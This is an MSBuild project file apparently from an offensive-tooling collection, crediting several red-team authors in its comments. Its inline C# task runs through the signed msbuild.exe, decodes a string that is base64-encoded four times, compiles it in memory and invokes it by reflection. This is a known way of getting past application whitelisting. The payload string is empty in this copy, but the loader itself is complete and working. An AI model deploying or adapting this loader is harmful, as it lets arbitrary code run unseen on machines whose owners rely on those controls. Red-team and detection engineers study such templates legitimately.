<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <!-- This inline task executes c# code. -->
  <!-- C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe nps.xml -->
  <!-- Original MSBuild Author: Casey Smith, Twitter: @subTee -->
  <!-- NPS Created By: Ben Ten, Twitter: @ben0xa -->
  <!-- Created C# payload: Franci Sacer, Twitter: @francisacer1 -->
  <!-- License: BSD 3-Clause -->
  <Target Name="npscsharp">
   <nps />
  </Target>
  <UsingTask
    TaskName="nps"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
  <Task>
      <Code Type="Class" Language="cs">
        <![CDATA[
        using System;
        using System.Collections.Generic;
        using System.Linq;
        using System.Text;
        using System.Runtime.InteropServices;
        using System.Collections.ObjectModel;
        using Microsoft.Build.Framework;
        using Microsoft.Build.Utilities;
        using Microsoft.CSharp;
        using System.CodeDom.Compiler;
        using System.Reflection;

        public class nps : Task, ITask
        {
            public override bool Execute()
            {
                Console.WriteLine("hey");
                string cmd = "";
                CSharpCodeProvider nps = new CSharpCodeProvider();
                CompilerParameters parameters = new CompilerParameters();
                parameters.ReferencedAssemblies.Add("System.dll");
                parameters.ReferencedAssemblies.Add("System.Runtime.InteropServices.dll");
                parameters.GenerateExecutable = false;
                parameters.GenerateInMemory = true;
                parameters.IncludeDebugInformation = false;
                CompilerResults results = nps.CompileAssemblyFromSource(parameters, Base64Decode(Base64Decode(Base64Decode(Base64Decode(cmd)))));
                Assembly assembly = results.CompiledAssembly;
                object obj = assembly.CreateInstance("ClassExample");
                obj.GetType().InvokeMember("Execute", BindingFlags.InvokeMethod, null, obj, null);
                return true;
            }

            public static string Base64Encode(string text) {
               return System.Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(text));
            }

            public static string Base64Decode(string encodedtext) {
                return System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String(encodedtext));
            }
        }
        ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>